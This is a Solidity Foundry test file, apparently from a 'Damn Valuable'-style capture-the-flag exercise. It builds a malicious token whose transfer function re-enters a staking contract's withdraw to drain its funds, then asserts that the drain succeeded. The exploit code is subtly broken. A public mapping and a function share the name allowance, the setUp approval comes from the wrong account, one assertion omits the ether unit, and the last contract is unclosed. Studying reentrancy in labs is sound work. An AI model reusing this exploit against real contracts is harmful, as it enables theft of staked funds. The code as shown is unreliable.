pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DamnValuableStaking.sol";

contract AttackToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    DamnValuableStaking public staking;
    bool public reentered;

    constructor() {
        balanceOf[msg.sender] = 200 ether;
    }

    function setStaking(address _staking) external {
        staking = DamnValuableStaking(_staking);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (msg.sender == address(staking) && !reentered && amount == 100 ether) {
            reentered = true;
            staking.withdraw(100 ether);
        }
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowance[owner][spender];
    }
}

contract StakingReentrancyTest is Test {
    AttackToken public dvt;
    DamnValuableStaking public staking;
    address public attacker;

    function setUp() public {
        dvt = new AttackToken();
        staking = new DamnValuableStaking(address(dvt));
        dvt.setStaking(address(staking));
        attacker = msg.sender;
        dvt.approve(address(staking), 200 ether);
        vm.startPrank(attacker);
        staking.stake(200 ether);
        vm.stopPrank();
    }

    function testReentrancyWithdraw() public {
        uint256 attackerDvtBalanceBefore = dvt.balanceOf(attacker);
        uint256 stakingDvtBalanceBefore = dvt.balanceOf(address(staking));
        assertEq(attackerDvtBalanceBefore, 0);
        assertEq(stakingDvtBalanceBefore, 200);

        vm.startPrank(attacker);
        staking.withdraw(100 ether);
        vm.stopPrank();

        uint256 attackerDvtBalanceAfter = dvt.balanceOf(attacker);
        assertEq(attackerDvtBalanceAfter, 200 ether);

        uint256 stakingDvtBalanceAfter = dvt.balanceOf(address(staking));
        assertEq(stakingDvtBalanceAfter, 0);

        uint256 totalSupplyAfter = staking.totalSupply();
        assertEq(totalSupplyAfter, 0);
    }
